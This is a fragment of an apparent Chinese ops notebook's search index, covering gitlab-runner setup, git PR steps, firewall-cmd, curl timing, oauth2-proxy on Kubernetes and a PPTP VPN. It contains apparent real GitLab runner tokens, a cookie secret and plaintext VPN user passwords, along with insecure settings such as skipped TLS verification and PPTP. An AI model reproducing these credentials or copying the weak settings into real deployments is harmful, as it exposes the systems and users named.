/opt/lib/gitlab-runner\ncat &gt; docker-compose.yaml &lt;&lt;EOF\nservices:\n  gitlab:\n    image: hub.8ops.top/build/gitlab-runner:ubuntu-v17.4.0\n    container_name: \"gitlab-runner-01\"\n    restart: always\n    environment:\n      CA_CERTIFICATES_PATH: '/etc/gitlab-runner/certs/ca.crt' # \u53d7\u4fe1\u79c1\u6709CA\n    volumes:\n      - \"/var/run/docker.sock:/var/run/docker.sock\"\n      - \"/opt/lib/gitlab-runner/config:/etc/gitlab-runner\"\n      - \"/opt/lib/gitlab-runner/cache:/cache\"\n      - \"/opt/lib/gitlab-runner/npm:/root/.npm\"\nEOF  \n\n# \u7b2c\u4e8c\u6b65\uff0c\u8fdb\u5165gitlab console \u6ce8\u518c\u5b9e\u4f8b\u5e76\u83b7\u53d6\u6ce8\u518c\u547d\u4ee4 \uff08Admin Area -&gt; Runners\uff09\ngitlab-runner register  --url https://git.8ops.top  --token glrt-zvyQjQV7FDszMetH1Yxu\n\n# \u7b2c\u4e09\u6b65\uff0c\u8fdb\u5165gitlab-runner\u5b9e\u4f8b\u8fdb\u884c\u6ce8\u518c\ndocker exec -it gitlab-runner bash\n\nroot@gitlab-runner:/# gitlab-runner register  --url https://git.8ops.top  --token glrt-Kdv9Ad4PHqJGyoyKQCp5\n</code></pre>"},{"location":"daily/18-git/#github-pr","title":"\u56db\u3001github PR","text":"<p>PR\u6b65\u9aa4\uff0c\u5728github\u4e2d\u7ecf\u5e38\u770b\u5230\u5f88\u591a\u597d\u7684\u5f00\u6e90\u9879\u76ee\uff0c\u6709\u4e9b\u529f\u80fd\u6ca1\u6709\u8986\u76d6\u5230\uff0c\u6216\u66b4\u9732\u51fa\u4e9bbug\u53ef\u4ee5\u901a\u8fc7PR\u5e2e\u5176\u5b8c\u5584</p> <pre><code># \u7b2c\u4e00\u6b65\uff0cfork repo \u5230\u81ea\u5df1\u5e10\u53f7\u4e0b\n\n# \u7b2c\u4e8c\u6b65\uff0c\u514b\u9686\u5230\u672c\u5730\ngit clone git@xxx\n\n# \u7b2c\u4e09\u6b65\uff0c\u4e0e\u539f repo \u5efa\u7acb\u94fe\u63a5\ngit remote add upstream https://github.com/xx/yy.git\ngit remote -v\n\n# \u7b2c\u56db\u6b65\uff0c\u5efa\u7acb\u5206\u652f\ngit checkout -b feature-xx\n\n# \u7b2c\u4e94\u6b65\uff0ccoding\uff0ccommit\ngit commit -m \"add feature xx\" .\n\n# \u7b2c\u516d\u6b65\uff0cpush\ngit push --set-upstream origin feature-xx\n\n# \u7b2c\u4e03\u6b65\uff0c\u81ea\u5df1\u5e10\u53f7\u4e0b\u521b\u5efa PR \u5230\u539f repo\uff0c\u63cf\u8ff0\u76f8\u5173\u5185\u5bb9\n</code></pre>"},{"location":"daily/18-git/#_3","title":"\u4e94\u3001\u53d8\u66f4\u8fdc\u7a0b\u5206\u652f","text":"<pre><code># \u91cd\u547d\u540d\u8fdc\u7a0b\u5206\u652f\u5bf9\u5e94\u7684\u672c\u5730\u5206\u652f\ngit branch -m oldName newName\n\n# \u5220\u9664\u8fdc\u7a0b\u5206\u652f\ngit push --delete origin oldName\n\n# \u4e0a\u4f20\u65b0\u547d\u540d\u7684\u672c\u5730\u5206\u652f\ngit push origin newName\n\n# \u5173\u8054\u8fdc\u7a0b\u5206\u652f\ngit branch --set-upstream-to origin/newName\n</code></pre>"},{"location":"daily/19-firewall/","title":"firewall","text":""},{"location":"daily/19-firewall/#iptables","title":"\u4e00\u3001iptables","text":""},{"location":"daily/19-firewall/#firewall-cmd","title":"\u4e8c\u3001firewall-cmd","text":"<pre><code># \u67e5\u770b\u8bbe\u7f6e\nfirewall-cmd --state  # \u663e\u793a\u72b6\u6001\nfirewall-cmd --get-active-zones  # \u67e5\u770b\u533a\u57df\u4fe1\u606f\nfirewall-cmd --get-zone-of-interface=eth0  # \u67e5\u770b\u6307\u5b9a\u63a5\u53e3\u6240\u5c5e\u533a\u57df\nfirewall-cmd --panic-on  # \u62d2\u7edd\u6240\u6709\u5305\nfirewall-cmd --panic-off  # \u53d6\u6d88\u62d2\u7edd\u72b6\u6001\nfirewall-cmd --query-panic  # \u67e5\u770b\u662f\u5426\u62d2\u7edd\nfirewall-cmd --runtime-to-permanent # \u5c06\u5f53\u524d\u9632\u706b\u5899\u7684\u89c4\u5219\u6c38\u4e45\u4fdd\u5b58\uff1b\n\nfirewall-cmd --reload # \u66f4\u65b0\u9632\u706b\u5899\u89c4\u5219\nfirewall-cmd --complete-reload\n# \u4e24\u8005\u7684\u533a\u522b\u5c31\u662f\u7b2c\u4e00\u4e2a\u65e0\u9700\u65ad\u5f00\u8fde\u63a5\uff0c\u5c31\u662ffirewalld\u7279\u6027\u4e4b\u4e00\u52a8\u6001\u6dfb\u52a0\u89c4\u5219\uff0c\u7b2c\u4e8c\u4e2a\u9700\u8981\u65ad\u5f00\u8fde\u63a5\uff0c\u7c7b\u4f3c\u91cd\u542f\u670d\u52a1\n\n# \u5c06\u63a5\u53e3\u6dfb\u52a0\u5230\u533a\u57df\uff0c\u9ed8\u8ba4\u63a5\u53e3\u90fd\u5728public\nfirewall-cmd --zone=public --add-interface=eth0\n# \u6c38\u4e45\u751f\u6548\u518d\u52a0\u4e0a --permanent \u7136\u540ereload\u9632\u706b\u5899\n\n# \u8bbe\u7f6e\u9ed8\u8ba4\u63a5\u53e3\u533a\u57df\uff0c\u7acb\u5373\u751f\u6548\u65e0\u9700\u91cd\u542f\nfirewall-cmd --set-default-zone=public\n\n# \u67e5\u770b\u6240\u6709\u6253\u5f00\u7684\u7aef\u53e3\uff1a\nfirewall-cmd --zone=dmz --list-ports\n\n# \u52a0\u5165\u4e00\u4e2a\u7aef\u53e3\u5230\u533a\u57df\uff1a\nfirewall-cmd --zone=dmz --add-port=8080/tcp\n# \u82e5\u8981\u6c38\u4e45\u751f\u6548\u65b9\u6cd5\u540c\u4e0a\n\n# \u6253\u5f00\u4e00\u4e2a\u670d\u52a1\uff0c\u7c7b\u4f3c\u4e8e\u5c06\u7aef\u53e3\u53ef\u89c6\u5316\uff0c\u670d\u52a1\u9700\u8981\u5728\u914d\u7f6e\u6587\u4ef6\u4e2d\u6dfb\u52a0\uff0c/etc/firewalld \u76ee\u5f55\u4e0b\u6709services\u6587\u4ef6\u5939\uff0c\u8fd9\u4e2a\u4e0d\u8be6\u7ec6\u8bf4\u4e86\uff0c\u8be6\u60c5\u53c2\u8003\u6587\u6863\nfirewall-cmd --zone=work --add-service=smtp\n\n# \u79fb\u9664\u670d\u52a1\nfirewall-cmd --zone=work --remove-service=smtp\n\n# \u663e\u793a\u652f\u6301\u7684\u533a\u57df\u5217\u8868\nfirewall-cmd --get-zones\n\n# \u8bbe\u7f6e\u4e3a\u5bb6\u5ead\u533a\u57df\nfirewall-cmd --set-default-zone=home\n\n# \u67e5\u770b\u5f53\u524d\u533a\u57df\nfirewall-cmd --get-active-zones\n\n# \u8bbe\u7f6e\u5f53\u524d\u533a\u57df\u7684\u63a5\u53e3\nfirewall-cmd --get-zone-of-interface=enp03s\n\n# \u663e\u793a\u6240\u6709\u516c\u5171\u533a\u57df\uff08public\uff09\nfirewall-cmd --zone=public --list-all\n\n# \u4e34\u65f6\u4fee\u6539\u7f51\u7edc\u63a5\u53e3\uff08enp0s3\uff09\u4e3a\u5185\u90e8\u533a\u57df\uff08internal\uff09\nfirewall-cmd --zone=internal --change-interface=enp03s\n\n# \u6c38\u4e45\u4fee\u6539\u7f51\u7edc\u63a5\u53e3enp03s\u4e3a\u5185\u90e8\u533a\u57df\uff08internal\uff09\nfirewall-cmd --permanent --zone=internal --change-interface=enp03s\n\n# \u663e\u793a\u670d\u52a1\u5217\u8868  \nAmanda, FTP, Samba\u548cTFTP\u7b49\u6700\u91cd\u8981\u7684\u670d\u52a1\u5df2\u7ecf\u88abFirewallD\u63d0\u4f9b\u76f8\u5e94\u7684\u670d\u52a1\uff0c\u53ef\u4ee5\u4f7f\u7528\u5982\u4e0b\u547d\u4ee4\u67e5\u770b\uff1a\n\nfirewall-cmd --get-services\n\n# \u5141\u8bb8SSH\u670d\u52a1\u901a\u8fc7\nfirewall-cmd --new-service=ssh\n\n# \u7981\u6b62SSH\u670d\u52a1\u901a\u8fc7\nfirewall-cmd --delete-service=ssh\n\n# \u6253\u5f00TCP\u76848080\u7aef\u53e3\nfirewall-cmd --enable ports=8080/tcp\n\n# \u4e34\u65f6\u5141\u8bb8Samba\u670d\u52a1\u901a\u8fc7600\u79d2\nfirewall-cmd --enable service=samba --timeout=600\n\n# \u663e\u793a\u5f53\u524d\u670d\u52a1\nfirewall-cmd --list-services\n\n# \u6dfb\u52a0HTTP\u670d\u52a1\u5230\u5185\u90e8\u533a\u57df\uff08internal\uff09\nfirewall-cmd --permanent --zone=internal --add-service=http\nfirewall-cmd --reload     # \u5728\u4e0d\u6539\u53d8\u72b6\u6001\u7684\u6761\u4ef6\u4e0b\u91cd\u65b0\u52a0\u8f7d\u9632\u706b\u5899\n\n# \u6253\u5f00443/TCP\u7aef\u53e3\nfirewall-cmd --add-port=443/tcp\n\n# \u6c38\u4e45\u6253\u5f003690/TCP\u7aef\u53e3\nfirewall-cmd --permanent --add-port=3690/tcp\n\n# \u6c38\u4e45\u6253\u5f00\u7aef\u53e3\u597d\u50cf\u9700\u8981reload\u4e00\u4e0b\uff0c\u4e34\u65f6\u6253\u5f00\u597d\u50cf\u4e0d\u7528\uff0c\u5982\u679c\u7528\u4e86reload\u4e34\u65f6\u6253\u5f00\u7684\u7aef\u53e3\u5c31\u5931\u6548\u4e86\n# \u5176\u5b83\u670d\u52a1\u4e5f\u53ef\u80fd\u662f\u8fd9\u6837\u7684\uff0c\u8fd9\u4e2a\u6ca1\u6709\u6d4b\u8bd5\nfirewall-cmd --reload\n\n# \u67e5\u770b\u9632\u706b\u5899\uff0c\u6dfb\u52a0\u7684\u7aef\u53e3\u4e5f\u53ef\u4ee5\u770b\u5230\nfirewall-cmd --list-all\n\n# FirewallD\u5305\u62ec\u4e00\u79cd\u76f4\u63a5\u6a21\u5f0f\uff0c\u4f7f\u7528\u5b83\u53ef\u4ee5\u5b8c\u6210\u4e00\u4e9b\u5de5\u4f5c\uff0c\u4f8b\u5982\u6253\u5f00TCP\u534f\u8bae\u76849999\u7aef\u53e3\nfirewall-cmd --direct -add-rule ipv4 filter INPUT 0 -p tcp --dport 9000 -j ACCEPT\n</code></pre> <p>Example</p> <pre><code>firewall-cmd --zone=internal --add-source=10.1.2.0/24 --permanent\nfirewall-cmd --reload\nfirewall-cmd --zone=internal --list-all\n\nfirewall-cmd --zone=internal --add-masquerade\n\ntelnet 10.1.2.51 22\n</code></pre>"},{"location":"daily/20-curl/","title":"curl","text":""},{"location":"daily/20-curl/#_1","title":"\u4e00\u3001\u7b80\u5355\u4f7f\u7528","text":""},{"location":"daily/20-curl/#11","title":"1.1 \u6253\u5370\u8be6\u60c5","text":"<pre><code>curl -v \"https://books.8ops.top/\" \ncurl -vv \"https://books.8ops.top/\" \ncurl -vvv \"https://books.8ops.top/\" \ncurl -vvvv \"https://books.8ops.top/\" \n</code></pre>"},{"location":"daily/20-curl/#12","title":"1.2 \u7ec8\u7aef\u8017\u65f6","text":"<pre><code>time curl -i \"https://books.8ops.top/\" \n</code></pre>"},{"location":"daily/20-curl/#13","title":"1.3 \u7b80\u5355\u8017\u65f6","text":"<pre><code>curl -s -o /dev/null \\\n  -w \"%{http_code}:%{time_connect}:%{time_starttransfer}:%{time_total}\" \\\n  \"https://books.8ops.top\"\n</code></pre>"},{"location":"daily/20-curl/#14","title":"1.4 \u4e30\u5bcc\u8017\u65f6","text":"<pre><code># 1\ncurl -s -o /dev/null \\\n  -w \"\\n\\nhttp_code: %{http_code}\\nhttp_connect: %{http_connect}s\\ncontent_type: %{content_type}s\\ntime_namelookup: %{time_namelookup}s\\ntime_redirect: %{time_redirect}s\\ntime_pretransfer: %{time_pretransfer}s\\ntime_connect: %{time_connect}s\\ntime_starttransfer: %{time_starttransfer}s\\ntime_total: %{time_total}s\\nspeed_download: %{speed_download}KB/s\\n\" \\\n  \"https://books.8ops.top/\" \n\n# 2\ncurl -s -o /dev/null -w \"\\n\n  http_code: \\t\\t %{http_code}\n  http_connect: \\t %{http_connect}s\n  content_type: \\t %{content_type}\n  time_namelookup: \\t %{time_namelookup}s\n  time_redirect: \\t %{time_redirect}s\n  time_pretransfer: \\t %{time_pretransfer}s\n  time_appconnect: \\t %{time_appconnect}s\n  time_connect: \\t %{time_connect}s\n  time_starttransfer: \\t %{time_starttransfer}s\n  time_total: \\t\\t %{time_total}s\n  speed_download: \\t %{speed_download}KB/s\n  \\n\" \\\n  https://books.8ops.top/\n</code></pre>"},{"location":"daily/20-curl/#15-curl","title":"1.5 curl \u5347\u7ea7","text":"<pre><code>CURL_VERSION=8.8.0\ncd /opt\nwget https://curl.se/download/curl-${CURL_VERSION}.tar.gz\ntar xzf curl-${CURL_VERSION}.tar.gz\n\n# \u6709\u63d0\u524d\u5347\u7ea7\u8fc7openssl\nLD_RUN_PATH=\"/usr/local/openssl/lib64\" \\\nLDFLAGS=\"-L/usr/local/openssl/lib64\" \\\nCPPFLAGS=\"-I/usr/local/openssl/include\" \\\nCFLAGS=\"-I/usr/local/openssl/include\" \\\n./configure --prefix=/usr/local --with-openssl=/usr/local/openssl\nmake &amp;&amp; make install\n</code></pre>"},{"location":"daily/20-curl/#_2","title":"\u4e8c\u3001\u547d\u4ee4\u8be6\u89e3","text":"<pre><code>-w, --write-out \n\n\u4ee5\u4e0b\u53d8\u91cf\u4f1a\u6309CURL\u8ba4\u4e3a\u5408\u9002\u7684\u683c\u5f0f\u8f93\u51fa\uff0c\u8f93\u51fa\u53d8\u91cf\u9700\u8981\u6309\u7167%{variable_name}\u7684\u683c\u5f0f\uff0c\u5982\u679c\u9700\u8981\u8f93\u51fa%\uff0cdouble\u4e00\u4e0b\u5373\u53ef\uff0c\u5373%%\uff0c\u540c\u65f6\uff0c\\n\u662f\u6362\u884c\uff0c\\r\u662f\u56de\u8f66\uff0c\\t\u662fTAB\u3002 \n\nurl_effective The URL that was fetched last. This is most meaningful if you've told curl to follow location: headers. \n\nfilename_effective The ultimate filename that curl writes out to. This is only meaningful if curl is told to write to a file with the --remote-name or --output option. It's most useful in combination with the --remote-header-name option. (Added in 7.25.1) \n\nhttp_code http\u72b6\u6001\u7801\uff0c\u5982200\u6210\u529f,301\u8f6c\u5411,404\u672a\u627e\u5230,500\u670d\u52a1\u5668\u9519\u8bef\u7b49\u3002(The numerical response code that was found in the last retrieved HTTP(S) or FTP(s) transfer. In 7.18.2 the alias response_code was added to show the same info.) \n\nhttp_connect The numerical code that was found in the last response (from a proxy) to a curl CONNECT request. (Added in 7.12.4) \n\ntime_total \u603b\u65f6\u95f4\uff0c\u6309\u79d2\u8ba1\u3002\u7cbe\u786e\u5230\u5c0f\u6570\u70b9\u540e\u4e09\u4f4d\u3002 \uff08The total time, in seconds, that the full operation lasted. The time will be displayed with millisecond resolution.\uff09 \n\ntime_namelookup DNS\u89e3\u6790\u65f6\u95f4,\u4ece\u8bf7\u6c42\u5f00\u59cb\u5230DNS\u89e3\u6790\u5b8c\u6bd5\u6240\u7528\u65f6\u95f4\u3002(The time, in seconds, it took from the start until the name resolving was completed.) \n\ntime_connect \u8fde\u63a5\u65f6\u95f4,\u4ece\u5f00\u59cb\u5230\u5efa\u7acbTCP\u8fde\u63a5\u5b8c\u6210\u6240\u7528\u65f6\u95f4,\u5305\u62ec\u524d\u8fb9DNS\u89e3\u6790\u65f6\u95f4\uff0c\u5982\u679c\u9700\u8981\u5355\u7eaf\u7684\u5f97\u5230\u8fde\u63a5\u65f6\u95f4\uff0c\u7528\u8fd9\u4e2atime_connect\u65f6\u95f4\u51cf\u53bb\u524d\u8fb9time_namelookup\u65f6\u95f4\u3002\u4ee5\u4e0b\u540c\u7406\uff0c\u4e0d\u518d\u8d58\u8ff0\u3002(The time, in seconds, it took from the start until the TCP connect to the remote host (or proxy) was completed.) \n\ntime_appconnect \u8fde\u63a5\u5efa\u7acb\u5b8c\u6210\u65f6\u95f4\uff0c\u5982SSL/SSH\u7b49\u5efa\u7acb\u8fde\u63a5\u6216\u8005\u5b8c\u6210\u4e09\u6b21\u63e1\u624b\u65f6\u95f4\u3002(The time, in seconds, it took from the start until the SSL/SSH/etc connect/handshake to the remote host was completed. (Added in 7.19.0)) \n\ntime_pretransfer \u4ece\u5f00\u59cb\u5230\u51c6\u5907\u4f20\u8f93\u7684\u65f6\u95f4\u3002(The time, in seconds, it took from the start until the file transfer was just about to begin. This includes all pre-transfer commands and negotiations that are specific to the particular protocol(s) involved.) \n\ntime_redirect \u91cd\u5b9a\u5411\u65f6\u95f4\uff0c\u5305\u62ec\u5230\u6700\u540e\u4e00\u6b21\u4f20\u8f93\u524d\u7684\u51e0\u6b21\u91cd\u5b9a\u5411\u7684DNS\u89e3\u6790\uff0c\u8fde\u63a5\uff0c\u9884\u4f20\u8f93\uff0c\u4f20\u8f93\u65f6\u95f4\u3002(The time, in seconds, it took for all redirection steps include name lookup, connect, pretransfer and transfer before the final transaction was started. time_redirect shows the complete execution time for multiple redirections. (Added in 7.12.3)) \n\ntime_starttransfer \u5f00\u59cb\u4f20\u8f93\u65f6\u95f4\u3002(The time, in seconds, it took from the start until the first byte was just about to be transferred. This includes time_pretransfer and also the time the server needed to calculate the result.) \n\nsize_download \u4e0b\u8f7d\u5927\u5c0f\u3002(The total amount of bytes that were downloaded.) \n\nsize_upload \u4e0a\u4f20\u5927\u5c0f\u3002(The total amount of bytes that were uploaded.) \n\nsize_header \u4e0b\u8f7d\u7684header\u7684\u5927\u5c0f(The total amount of bytes of the downloaded headers.) \n\nsize_request \u8bf7\u6c42\u7684\u5927\u5c0f\u3002(The total amount of bytes that were sent in the HTTP request.) \n\nspeed_download \u4e0b\u8f7d\u901f\u5ea6\uff0c\u5355\u4f4d-\u5b57\u8282\u6bcf\u79d2\u3002(The average download speed that curl measured for the complete download. Bytes per second.) \n\nspeed_upload \u4e0a\u4f20\u901f\u5ea6,\u5355\u4f4d-\u5b57\u8282\u6bcf\u79d2\u3002(The average upload speed that curl measured for the complete upload. Bytes per second.) \n\ncontent_type \u5c31\u662fcontent-Type\uff0c\u4e0d\u7528\u591a\u8bf4\u4e86\uff0c\u8fd9\u662f\u4e00\u4e2a\u8bbf\u95ee\u6211\u535a\u5ba2\u9996\u9875\u8fd4\u56de\u7684\u7ed3\u679c\u793a\u4f8b(text/html; charset=UTF-8)\uff1b(The Content-Type of the requested document, if there was any.) \n\nnum_connects Number of new connects made in the recent transfer. (Added in 7.12.3) \n\nnum_redirects Number of redirects that were followed in the request. (Added in 7.12.3) \n\nredirect_url When a HTTP request was made without -L to follow redirects, this variable will show the actual URL a redirect would take you to. (Added in 7.18.2) \n\nftp_entry_path The initial path libcurl ended up in when logging on to the remote FTP server. (Added in 7.15.4) \n\nssl_verify_result ssl\u8ba4\u8bc1\u7ed3\u679c\uff0c\u8fd4\u56de0\u8868\u793a\u8ba4\u8bc1\u6210\u529f\u3002( The result of the SSL peer certificate verification that was requested. 0 means the verification was successful. (Added in 7.19.0)) \n</code></pre>"},{"location":"daily/21-oauth2/","title":"oauth2","text":""},{"location":"daily/21-oauth2/#_1","title":"\u4e00\u3001\u80cc\u666f","text":"<ul> <li>ingress-nginx</li> <li>ingress</li> <li>echoserver</li> </ul> <p>Reference</p> <p>Source</p> <p>Source</p>"},{"location":"daily/21-oauth2/#_2","title":"\u4e8c\u3001\u6b65\u9aa4","text":"<p>app echoserver alerady exists.</p>"},{"location":"daily/21-oauth2/#21-create-gitlab-application","title":"2.1 create gitlab application","text":"<p><code>Admin --&gt; Applications</code></p> <p>Get</p> <ul> <li>Application ID</li> <li>Secret</li> <li>Callback URL</li> <li>Scopes - group,openid,profile,email</li> <li>Trusted - yes</li> <li>Confidential - yes</li> </ul>"},{"location":"daily/21-oauth2/#22-create-oauth2-proxy","title":"2.2 create oauth2-proxy","text":"<pre><code>apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: oauth2-proxy\n  name: oauth2-proxy\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: oauth2-proxy\n  template:\n    metadata:\n      labels:\n        app: oauth2-proxy\n    spec:\n      containers:\n      - name: oauth2-proxy\n        image: hub.8ops.top/middleware/oauth2-proxy:v7.4.0-amd64\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 4180\n          protocol: TCP\n        args:\n        - --provider=gitlab\n        - --upstream=file:///dev/null\n        - --http-address=0.0.0.0:4180\n        - --cookie-secure=false\n        - --redirect-url=https://echoserver.8ops.top/oauth2/callback\n        - --skip-provider-button=false\n        - --set-xauthrequest=true\n        - --skip-auth-preflight=false\n        - --skip-oidc-discovery\n        - --oidc-issuer-url=https://git.8ops.top\n        - --login-url=https://git.8ops.top/oauth/authorize\n        - --redeem-url=https://git.8ops.top/oauth/token\n        - --oidc-jwks-url=https://git.8ops.top/oauth/discovery/keys\n        - --email-domain=*\n        env:\n        - name: OAUTH2_PROXY_CLIENT_ID\n          value: xx\n        - name: OAUTH2_PROXY_CLIENT_SECRET\n          value: xx\n        - name: OAUTH2_PROXY_COOKIE_SECRET\n          value: 9Lva8VIF3xXJQRkmM7i5Iw==\n---\napiVersion: v1\nkind: Service\nmetadata:\n  labels:\n    app: oauth2-proxy\n  name: oauth2-proxy\nspec:\n  ports:\n  - name: http\n    port: 4180\n    protocol: TCP\n    targetPort: 4180\n  selector:\n    app: oauth2-proxy\n</code></pre> <p>\u5f53\u9700\u8981\u6307\u5b9a\u67d0\u4e2a\u7fa4\u7ec4\u65f6</p> <p>roles</p> <pre><code># \u5728gitlab\u91cc\u9762\u521b\u5efa\u4e00\u4e2a\u7fa4\u7ec4\uff0c\u6210\u5458\u53ef\u4ee5\u8bbf\u95ee\n        - --gitlab-group=\"echoserver-group,abc-group\"\n\n# \u5728gitlab\u91cc\u9762\u521b\u5efa\u4e00\u4e2a\u4ed3\u5e93\uff0c\u6210\u5458\u53ef\u4ee5\u8bbf\u95ee\n        - --gitlab-project=\"oauth2/kibana-app-prod=10\"\n</code></pre> <p>args</p> <pre><code>        - args:\n            - --provider=gitlab\n            - --http-address=0.0.0.0:4180\n            - --ssl-insecure-skip-verify=true\n            - --ssl-upstream-insecure-skip-verify=true\n            - --redirect-url=https://echoserver.8ops.top/oauth2/callback\n            - --client-id=xxx\n            - --client-secret=xx\n            - --cookie-secret=xx\n            - --oidc-issuer-url=https://git.8ops.top\n            # - --gitlab-group=\"oauth2\"\n            - --gitlab-project=\"oauth2/echoserver=10\"\n            - --upstream=file:///dev/null\n            - --email-domain=*\n            - --cookie-secure=true\n            - --reverse-proxy=true\n            - --set-xauthrequest=true\n            - --pass-host-header=true\n            - --pass-user-headers=true\n            # - --session-store-type=redis\n            # - --redis-connection-url=redis://127.0.0.1:6379\n</code></pre>"},{"location":"daily/21-oauth2/#23-create-ingress","title":"2.3 create ingress","text":"<pre><code>apiVersion: networking.k8s.io/v1\nkind: Ingress\nmetadata:\n  annotations:\n    nginx.ingress.kubernetes.io/auth-url: \"https://$host/oauth2/auth\"\n    nginx.ingress.kubernetes.io/auth-signin: \"https://$host/oauth2/start?rd=$escaped_request_uri\"\n    nginx.ingress.kubernetes.io/force-ssl-redirect: \"false\"\n    nginx.ingress.kubernetes.io/limit-rps: \"100\"\n    nginx.ingress.kubernetes.io/ssl-redirect: \"false\"\n  labels:\n    app: echoserver\n    argocd.argoproj.io/instance: lab-ofc-toolkit\n  name: echoserver\n  namespace: default\nspec:\n  ingressClassName: external\n  rules:\n  - host: echoserver.8ops.top\n    http:\n      paths:\n      - backend:\n          service:\n            name: echoserver\n            port:\n              number: 8080\n        path: /\n        pathType: Prefix\n  tls:\n  - hosts:\n    - echoserver.8ops.top\n    secretName: tls-8ops.top\n---\napiVersion: networking.k8s.io/v1\nkind: Ingress\nmetadata:\n  name: oauth2-proxy\n  namespace: default\nspec:\n  ingressClassName: external\n  rules:\n  - host: echoserver.8ops.top\n    http:\n      paths:\n      - path: /oauth2\n        pathType: Prefix\n        backend:\n          service:\n            name: oauth2-proxy\n            port:\n              number: 4180\n  tls:\n  - hosts:\n    - echoserver.8ops.top\n    secretName: tls-8ops.top\n</code></pre>"},{"location":"daily/33-ppp/","title":"ppp","text":""},{"location":"daily/33-ppp/#server","title":"\u4e00\u3001Server","text":"<pre><code>rpm -Uvh http://poptop.sourceforge.net/yum/stable/rhel6/pptp-release-current.noarch.rpm\n\u52a0\u5165yum\u6e90\n2.yum install pptpd\n\n3. yum install ppp\n4.vi /etc/ppp/options.pptpd\n\n1\u3001\u914d\u7f6e\u6587\u4ef6\u7f16\u5199\n\u2460\u3001\u914d\u7f6e\u6587\u4ef6/etc/ppp/options.pptpd\nmv /etc/ppp/options.pptpd /etc/ppp/options.pptpd.bak\nvi /etc/ppp/options.pptpd\n\u8f93\u5165\u4ee5\u4e0b\u5185\u5bb9\uff1a\nname pptpd\nrefuse-pap\nrefuse-chap\nrefuse-mschap\nrequire-mschap-v2\nrequire-mppe-128\nproxyarp\nlock\nnobsdcomp\nnovj\nnovjccomp\nnologfd\nidle 2592000\nms-dns 8.8.8.8  //DNS\u53ef\u4ee5\u4e0d\u8bbe\u7f6e\nms-dns 8.8.4.4\n\n---\n\n\u2461\u3001\u914d\u7f6e\u6587\u4ef6/etc/ppp/chap-secrets\nmv /etc/ppp/chap-secrets /etc/ppp/chap-secrets.bak\nvi /etc/ppp/chap-secrets\n\u8f93\u5165\u4ee5\u4e0b\u5185\u5bb9\n\nSecrets for authentication using CHAP\n\nclient         server   secret                   IP addresses\n\nzhangjie pptpd ssxcEDfgd 10.0.0.250\nvmcenter pptpd asdfdDSDF 10.0.0.251\nwangyi   pptpd vpnOttpod 10.0.0.252\nwangjian pptpd Dg3e20exq 10.0.0.253\n\n  \u6ce8\uff1a\u8fd9\u91cc\u7684myusername\u548cmypassword\u5373\u4e3aPPTP VPN\u7684\u767b\u5f55\u7528\u6237\u540d\u548c\u5bc6\u7801\n\n---\n\n\u2462\u3001\u914d\u7f6e\u6587\u4ef6/etc/pptpd.conf\nmv /etc/pptpd.conf /etc/pptpd.conf.bak\nvi /etc/pptpd.conf\n\u8f93\u5165\u4ee5\u4e0b\u5185\u5bb9\uff1a\noption /etc/ppp/options.pptpd\nlogwtmp\nlocalip 117.135.151.114\nremoteip 10.0.0.250-254\n  \u6ce8\uff1a\u4e3a\u62e8\u5165VPN\u7684\u7528\u6237\u52a8\u6001\u5206\u914d192.168.1.250\uff5e192.168.1.252\u4e4b\u95f4\u7684IP\n\n---\n\n\u2463\u3001\u914d\u7f6e\u6587\u4ef6/etc/sysctl.conf\nvi /etc/sysctl.conf\n\u4fee\u6539\u4ee5\u4e0b\u5185\u5bb9\uff1a\nnet.ipv4.ip_forward = 1\n\n\u4fdd\u5b58\u3001\u9000\u51fa\u540e\u6267\u884c\uff1a\n/sbin/sysctl -p\n\n---\n\n3\u3001\u542f\u52a8PPTP VPN \u670d\u52a1\u5668\u7aef\uff1a\n/sbin/service pptpd start\n\n---\n\n  4\u3001\u542f\u52a8iptables\uff1a//\u53ef\u8bbe\u7f6e\u4e5f\u53ef\u4e0d\u8bbe\u7f6e,\u5982\u9632\u706b\u5899\u5f00\u542f\u5219\u4e00\u5b9a\u8981\u8bbe\u7f6e\n/sbin/service iptables start\n/sbin/iptables -t nat -A POSTROUTING -o eth0 -s 192.168.1.0/24 -j MASQUERADE\n</code></pre>"},{"location":"daily/33-ppp/#client","title":"\u4e8c\u3001Client","text":"<pre><code>1\uff0c\u5b89\u88c5pptp\u5ba2\u6237\u7aef\ncd /usr/local/src\n\nwget http://nchc.dl.sourceforge.net/sourceforge/pptpclient/pptp-1.7.1.tar.gz\n\nwget http://superb-dca3.dl.sourceforge.net/project/pptpclient/pptp/pptp-1.8.0/pptp-1.8.0.tar.gz\ntar xvzf pptp-1.7.1.tar.gz\ncd pptp-1.7.1\nmake &amp;&amp; make install\n\n2\uff0c\u914d\u7f6e\nvim /etc/ppp/peers/qtestin-21\n\nremotename Tmonitor\nlinkname Tmonitor\nipparam Tmonitor\npty \"pptp vpn.yw.qtestin.com --nolaunchpppd \"\nname Tmonitor\nusepeerdns\nrequire-mppe\nrefuse-eap\nnoauth\n\n3\uff0c\u62e8\u53f7\npppd call qtestin-21\nroute add -net 10.10.10.0 netmask 255.255.255.0 dev ppp0\n\nroute add -net 172.16.0.0/16 dev ppp0\n\npptp.sh\n1.9 KB\n\n\n\n4\uff0c\u6d4b\u8bd5\n\u901a\u8fc7\n\nvpn \u670d\u52a1\u5668\n\niptables -t nat -A  POSTROUTING -s 10.10.10.0/24 -o eth1 -j MASQUERADE\niptables -t nat -A  POSTROUTING -s 10.10.10.0/24 -o ppp0 -j MASQUERADE\n\nwindows client\nroute delete 10.0.0.0\nroute add 10.0.0.0/8 10.10.10.10\n\nQTestin-david ==&gt; qtestin-15\uff08\u80fd\u51fa\u4e0d\u80fd\u8fdb\uff0c\u8ddf\u516c\u53f8\u7684\u9632\u706b\u5899\u6709\u5173\uff09\nA43S-david ==&gt;qtestin-16\nbeijing_tele_118.244.134.34     ==&gt; qtestin-17\nchongqing_tele_219.153.64.211 ==&gt; 